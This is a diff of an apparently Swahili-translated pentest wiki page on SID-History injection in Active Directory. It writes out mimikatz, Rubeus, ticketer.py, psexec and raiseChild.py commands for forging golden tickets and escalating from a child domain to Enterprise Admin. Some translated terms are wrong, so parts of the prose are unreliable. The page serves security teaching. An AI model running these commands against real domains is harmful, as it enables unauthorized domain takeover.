@@ -1,28 +1,31 @@
-# Kuingizwa kwa Historia ya SID
+# SID-History Injection
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Shambulio la Kuingiza Historia ya SID
+## SID History Injection Attack
 
-Lengo la **Shambulio la Kuingiza Historia ya SID** ni kusaidia **uhamisho wa mtumiaji kati ya uwanja** huku uhakikisha upatikanaji endelevu wa rasilimali kutoka kwenye uwanja wa awali. Hii inafanikiwa kwa **kuunganisha Kitambulisho cha Usalama (SID) cha awali cha mtumiaji kwenye Historia ya SID** ya akaunti yao mpya. Kwa umuhimu, mchakato huu unaweza kudhibitiwa ili kutoa upatikanaji usiohalali kwa kuongeza SID ya kikundi cha haki kubwa (kama vile Enterprise Admins au Domain Admins) kutoka kwenye uwanja wa mzazi kwenye Historia ya SID. Udanganyifu huu unatoa upatikanaji wa rasilimali zote ndani ya uwanja wa mzazi.
+Lengo la **SID History Injection Attack** ni kusaidia **uhamaji wa watumiaji kati ya maeneo** huku ikihakikisha upatikanaji wa rasilimali kutoka eneo la zamani. Hii inafanywa kwa **kujumuisha Kitambulisho cha Usalama (SID) cha mtumiaji wa zamani katika Historia ya SID** ya akaunti yao mpya. Kwa kuzingatia, mchakato huu unaweza kudhibitiwa ili kutoa upatikanaji usioidhinishwa kwa kuongeza SID ya kundi lenye mamlaka makubwa (kama vile Enterprise Admins au Domain Admins) kutoka eneo la mzazi kwenye Historia ya SID. Ukatili huu unatoa upatikanaji wa rasilimali zote ndani ya eneo la mzazi.
 
-Kuna njia mbili za kutekeleza shambulio hili: kupitia uundaji wa **Tiketi ya Dhahabu** au **Tiketi ya Almasi**.
+Njia mbili zipo za kutekeleza shambulio hili: kupitia uundaji wa **Golden Ticket** au **Diamond Ticket**.
 
-Ili kubainisha SID ya kikundi cha **"Enterprise Admins"**, kwanza lazima utambue SID ya uwanja wa msingi. Baada ya kutambua hilo, SID ya kikundi cha Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya uwanja wa msingi. Kwa mfano, ikiwa SID ya uwanja wa msingi ni `S-1-5-21-280534878-1496970234-700767426`, SID inayopatikana kwa kikundi cha "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.
+Ili kubaini SID ya kundi la **"Enterprise Admins"**, mtu lazima kwanza apate SID ya eneo la mzazi. Baada ya kutambua, SID ya kundi la Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya eneo la mzazi. Kwa mfano, ikiwa SID ya eneo la mzazi ni `S-1-5-21-280534878-1496970234-700767426`, SID inayotokana kwa kundi la "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.
 
-Unaweza pia kutumia kikundi cha **Domain Admins**, ambacho kinamalizia na **512**.
+Unaweza pia kutumia vikundi vya **Domain Admins**, ambavyo vinamalizika kwa **512**.
 
-Njia nyingine ya kupata SID ya kikundi cha uwanja mwingine (kwa mfano "Domain Admins") ni kwa kutumia:
+Njia nyingine ya kupata SID ya kundi la eneo lingine (kwa mfano "Domain Admins") ni kwa:
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -47,7 +50,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 {% endcode %}
 
-Kwa habari zaidi kuhusu tiketi za dhahabu angalia:
+Kwa maelezo zaidi kuhusu tiketi za dhahabu angalia:
 
 {% content-ref url="golden-ticket.md" %}
 [golden-ticket.md](golden-ticket.md)
@@ -67,10 +70,10 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 ```
 {% endcode %}
 
-Kwa habari zaidi kuhusu tiketi za almasi angalia:
+Kwa maelezo zaidi kuhusu tiketi za almasi angalia:
 
 {% content-ref url="diamond-ticket.md" %}
-[diamond-ticket.md](diamond-ticket.md)
+[tiketi-za-almasi.md](diamond-ticket.md)
 {% endcontent-ref %}
 
 {% code overflow="wrap" %}
@@ -81,7 +84,7 @@ ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-Pandisha hadi DA ya mizizi au Msimamizi wa Kampuni kwa kutumia KRBTGT hash ya kikoa kilichovamiwa:
+Pandisha hadi DA wa root au Enterprise admin ukitumia hash ya KRBTGT ya eneo lililoathirika:
 
 {% code overflow="wrap" %}
 ```bash
@@ -97,15 +100,15 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-Kwa ruhusa zilizopatikana kutoka kwa shambulio, unaweza kutekeleza kwa mfano shambulio la DCSync katika kikoa kipya:
+Kwa ruhusa zilizopatikana kutoka kwa shambulio unaweza kutekeleza kwa mfano shambulio la DCSync katika eneo jipya:
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-### Kutoka kwa linux
+### Kutoka linux
 
-#### Kwa kutumia [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### Mwongozo na [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 
 {% code overflow="wrap" %}
 ```bash
@@ -129,36 +132,39 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 {% endcode %}
 
-#### Kiotomatiki kwa kutumia [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Hii ni script ya Impacket ambayo ita**utomatisha kuongeza hadhi kutoka kwa kikoa cha mtoto hadi kikoa cha mzazi**. Script inahitaji:
+Hii ni skripti ya Impacket ambayo itafanya **kuongeza kutoka kwa domain ya mtoto hadi domain ya mzazi**. Skripti inahitaji:
 
-* Kikoa cha lengo cha kudhibiti
-* Vitambulisho vya mtumiaji wa admin katika kikoa cha mtoto
+* Kiongozi wa domain ya lengo
+* Akawasilisha kwa mtumiaji wa admin katika domain ya mtoto
 
 Mchakato ni:
 
-* Inapata SID kwa kikundi cha Enterprise Admins cha kikoa cha mzazi
-* Inapata hash kwa akaunti ya KRBTGT katika kikoa cha mtoto
-* Inaunda Golden Ticket
-* Ingia kwenye kikoa cha mzazi
-* Inapata vitambulisho kwa akaunti ya Administrator katika kikoa cha mzazi
-* Ikiwa kubadilisha `target-exec` imeelezewa, inathibitisha kwa Msimamizi wa Kudhibiti wa Kikoa cha kikoa cha mzazi kupitia Psexec.
+* Inapata SID ya kundi la Enterprise Admins la domain ya mzazi
+* Inapata hash ya akaunti ya KRBTGT katika domain ya mtoto
+* Inaunda Tiketi ya Dhahabu
+* Inajiandikisha katika domain ya mzazi
+* Inapata akawasilisha kwa akaunti ya Msimamizi katika domain ya mzazi
+* Ikiwa swichi ya `target-exec` imeainishwa, inathibitisha kwa Kiongozi wa Domain wa domain ya mzazi kupitia Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## Marejeo
+## References
 * [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
 * [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye repo ya [hacktricks](https://github.com/carlospolop/hacktricks) na [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
